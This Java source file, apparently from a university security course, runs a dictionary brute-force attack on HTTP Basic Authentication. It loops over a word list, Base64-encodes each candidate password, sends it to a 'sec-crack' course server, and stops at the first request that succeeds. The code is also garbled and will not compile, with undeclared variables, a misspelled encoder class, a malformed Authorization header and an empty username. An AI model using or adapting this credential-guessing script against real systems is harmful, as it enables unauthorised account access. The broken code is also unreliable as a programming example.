
import java.io.*;
import java.net.*;
import java.util.*;
import java.*;

public class Dictionary
{

  public static void  main(String args[])
  {
    StringWriter sw = new StringWriter();
    PrintWriter  pw = new PrintWriter();
    int flag=1;
    String filename = "words";
   try
   {
     String urlString = new String("http://sec-crack.cs.rmit.edu./SEC/2/");
     String thePassword= new String();

     BufferedReader inputStream= new BufferedReader(new FileReader(filename));
     String line=inputStream.readLine();
     stime = System.currentTimeMillis();
     while (line!= null && flag==1)
	 {
          try {
            URL url = new URL (urlString);


            String userPassword = "" + ":" + line;
            String encoding = new url.misc.BASE64Encoder().encode(userPassword.getBytes());


            URLConnection uc = url.openConnection();
            uc.setRequestProperty("Authorization", " " + encoding);
            InputStream content = (InputStream)uc.getContent();
     endtime = System.currentTimeMillis();
            BufferedReader in   =
                      new BufferedReader (new InputStreamReader (content));
            String line2;
            while ((line2 = in.readLine()) != null) {
            pw.println (line2);
            }
            flag=0;
    System.out.println("process time is : " +(endtime-stime)/1000 +" seconds.");
          }catch (MalformedURLException e) {

           flag=1;
          }catch (IOException e) {

           flag=1;
          }
        line=inputStream.readLine();
     }
     inputStream.close();
   }
   catch(FileNotFoundException e)
   {
	 System.err.println("File "+filename+" was not found");
   }
   catch(IOException e)
   {
 	 System.err.println("Error ");
   }

   System.out.println("content is "+ sw.toString());
  }
 }